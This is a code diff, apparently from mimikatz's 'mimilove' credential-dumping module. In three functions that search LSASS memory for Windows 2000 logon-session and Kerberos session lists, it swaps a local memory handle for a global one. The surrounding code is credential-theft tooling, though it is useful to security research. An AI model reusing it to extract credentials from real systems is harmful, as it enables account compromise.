@@ -51,8 +51,7 @@ int wmain(int argc, wchar_t *argv[])
 BOOL kuhl_m_sekurlsa_utils_love_search(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION mi, PKULL_M_MINI_PATTERN pa, PVOID * genericPtr)
 {
 	BOOL status = FALSE;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, mi->DllBase.hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, mi->DllBase.hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{mi->DllBase.address, mi->DllBase.hMemory}, mi->SizeOfImage}, NULL};
 	aLocalMemory.address = pa->Pattern;
 	if(kull_m_memory_search(&aLocalMemory, pa->Length, &sMemory, FALSE))
@@ -89,8 +88,7 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 	KULL_M_MINI_PATTERN paLsasrv = {sizeof(PTRN_W2K_LogonSessionTable), PTRN_W2K_LogonSessionTable, -9};
 	PLIST_ENTRY LogonSessionTable = NULL;
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miLsasrv;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PVOID baseTable, base;
 	KIWI_MSV1_0_LOGON_SESSION_TABLE_50 table;
 	KIWI_MSV1_0_LIST_50 list;
@@ -271,8 +269,7 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 	KULL_M_MINI_PATTERN paKerberos = {sizeof(PTRN_W2K_KerbLogonSessionList), PTRN_W2K_KerbLogonSessionList, -8};
 	PLIST_ENTRY KerbLogonSessionList = NULL;
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miKerberos;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PVOID base;
 	BYTE hash;
 	KIWI_KERBEROS_LOGON_SESSION_50 session;
